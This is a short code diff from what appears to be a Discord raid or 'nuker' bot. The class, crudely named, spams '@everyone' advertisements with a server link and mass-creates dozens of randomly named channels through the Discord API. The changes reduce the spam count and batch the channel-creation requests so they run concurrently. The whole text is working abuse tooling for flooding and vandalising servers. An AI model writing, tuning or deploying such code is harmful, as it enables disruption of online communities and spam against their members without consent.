@@ -15,7 +15,7 @@ class Fucker:
         self.headers = headers
 
     async def spam(self, ctx):
-        spam_amount = 10
+        spam_amount = 5
         urls = []
         json = {"content": f"@everyone BEST BOT?? TRY {NAME}\n{LINKSERV}"}
 
@@ -35,10 +35,11 @@ class Fucker:
             f"https://discord.com/api/v9/guilds/{self.ctx.guild.id}/channels"
             for _ in range(35)
         ]
+        jsons = [
+            {"name": random.choice(CHNAME), "topic": "", "type": 0} for _ in urls
+        ]
         async with ClientSession(headers=self.headers, connector=None) as session:
-            for url in urls:
-                json = {"name": random.choice(CHNAME), "topic": "", "type": 0}
-                await create_tasks([url], session.post, self.headers, json)
+            await create_tasks(urls, session.post, self.headers, jsons)
 
     async def create_event(self, ctx):
         name = NAME
